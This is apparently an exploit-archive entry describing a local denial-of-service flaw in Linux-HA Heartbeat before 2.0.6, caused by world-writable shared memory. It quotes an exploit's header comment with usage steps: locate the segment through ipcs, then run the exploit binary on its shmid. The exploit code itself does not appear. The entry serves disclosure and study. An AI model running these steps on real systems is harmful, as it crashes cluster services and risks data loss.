Since Linux-HA Heartbeat has insecure default permissions set on shared memory, local attackers may be able to cause a denial of service.

Exploitation would most likely result in a system crash, loss of data, and resource exhaustion, leading to a denial of service if critical files are accessed improperly or overwritten in the attack. Other attacks may be possible as well.

 * Heartbeat < 2.0.6 Insecure Shared Memory - Local Denial of Service.
 *
 * Credits: Yan Rong Ge, see link below:

 * Tested on Heartbeat 2.0.5.
 *
 * Thanks for Wendel Guglielmetti, Waldemar Nehgme,

 * Usage:
 * [security@mail1 tmp]$ ipcs
 *
 * ------ Shared Memory Segments --------
 * key        shmid      owner      perms      bytes      nattch     status
 * 0x00000000 1638402    root      666        7296       6          dest
 *
 * ------ Semaphore Arrays --------
 * ....
 * Get shmid of heartbeat(look perms == 666, this is wrong!!!:))
 *
 *  [security@mail1 tmp]$ ./itts_sharedex2 1638402 "Intruders Tiger Team Security.."
 *
 * The heartbeatï¿½s process will droped.
